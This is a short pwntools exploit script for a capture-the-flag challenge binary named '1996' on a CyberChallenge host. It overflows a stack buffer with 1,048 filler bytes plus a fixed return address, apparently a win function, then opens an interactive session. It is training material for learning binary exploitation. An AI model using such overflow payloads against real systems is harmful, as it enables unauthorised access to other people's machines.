#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
exe = context.binary = ELF(args.EXE or './1996')

host = args.HOST or '1996.challs.cyberchallenge.it'
port = int(args.PORT or 9121)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
br *0x400931
'''.format(**locals())

# -- Exploit goes here --

io = start()

payload = b"A"*(1024 + 24) + flat(0x400897)

io.sendlineafter(b"? ", payload)

io.interactive()

